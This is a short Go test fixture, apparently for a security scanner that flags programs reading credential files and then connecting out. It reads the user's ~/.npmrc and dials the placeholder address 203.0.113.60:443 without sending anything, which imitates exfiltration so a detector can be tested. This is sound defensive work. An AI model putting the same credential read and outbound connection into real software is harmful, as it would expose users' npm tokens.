// Fixture: reads a HEURISTIC-confidence marker (.npmrc, not a private
// key) and connects out in the same run. Proves the exfil-correlation
// finding ranks first regardless of the underlying credential read's
// own confidence -- not just when it's paired with a definite-confidence
// marker like id_rsa (already covered by allowlist-mechanism's
// still-correlates-with-network.go, which happens to use id_rsa).
package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"time"
)

func main() {
	_, _ = os.ReadFile(filepath.Join(os.Getenv("HOME"), ".npmrc"))
	if conn, err := net.DialTimeout("tcp", "203.0.113.60:443", 2*time.Second); err == nil {
		conn.Close()
	}
	fmt.Println("exfil-ranks-first-even-with-heuristic-marker: done")
}
